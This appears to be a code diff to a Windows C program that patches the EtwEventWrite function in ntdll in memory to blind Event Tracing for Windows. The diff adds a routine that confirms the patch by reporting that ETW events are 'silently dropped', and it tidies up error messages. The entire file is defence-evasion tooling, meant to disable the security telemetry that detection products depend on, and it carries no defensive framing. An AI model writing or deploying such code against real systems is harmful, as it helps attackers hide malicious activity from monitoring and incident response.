@@ -1,5 +1,24 @@
 #include <windows.h>
+#include <evntprov.h>
 #include <stdio.h>
+
+typedef ULONG (WINAPI* fnEtwEventWrite)(
+    REGHANDLE              RegHandle,
+    EVENT_DESCRIPTOR const *EventDescriptor,
+    ULONG                  UserDataCount,
+    EVENT_DATA_DESCRIPTOR  *UserData
+);
+
+BOOL CheckETW(fnEtwEventWrite pFn) {
+    ULONG status = pFn(0, NULL, 0, NULL);
+    printf("[+] EtwEventWrite returned: 0x%08lX\n", status);
+    if (status == 0) {
+        printf("[+] ETW is BLIND - events are silently dropped\n");
+        return TRUE;
+    }
+    printf("[-] ETW is still active\n");
+    return FALSE;
+}
 
 VOID PrintBytes(PVOID pAddress, SIZE_T size) {
     BYTE* pBytes = (BYTE*)pAddress;
@@ -23,7 +42,7 @@ int main()
     pEtwEventWrite = GetProcAddress(GetModuleHandleA("ntdll"), "EtwEventWrite");
     if (!pEtwEventWrite)
     {
-        printf("[!] GetProcAddress failed with error %d \n", GetLastError());
+        printf("[!] GetProcAddress failed with error %lu \n", GetLastError());
         return FALSE;
     }
 
@@ -36,7 +55,7 @@ int main()
     
     if (!VirtualProtect(pEtwEventWrite, sizeof(pShellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection))
     {
-        printf("[!] VirtualProtect [1] failed with error %d \n", GetLastError());
+        printf("[!] VirtualProtect [1] failed with error %lu \n", GetLastError());
         return FALSE;
     }
 
@@ -44,13 +63,16 @@ int main()
 
     if (!VirtualProtect(pEtwEventWrite, sizeof(pShellcode), dwOldProtection, &dwOldProtection))
     {
-        printf("[!] VritualProtect [2] failed with error %d \n", GetLastError());
+        printf("[!] VirtualProtect [2] failed with error %lu \n", GetLastError());
         return FALSE;
     }
 
     printf("After Patching..\n");
     PrintBytes(pEtwEventWrite, 6);
-    getchar();
+
+    CheckETW((fnEtwEventWrite)pEtwEventWrite);
+
+    // getchar();
 
     return TRUE;
 }
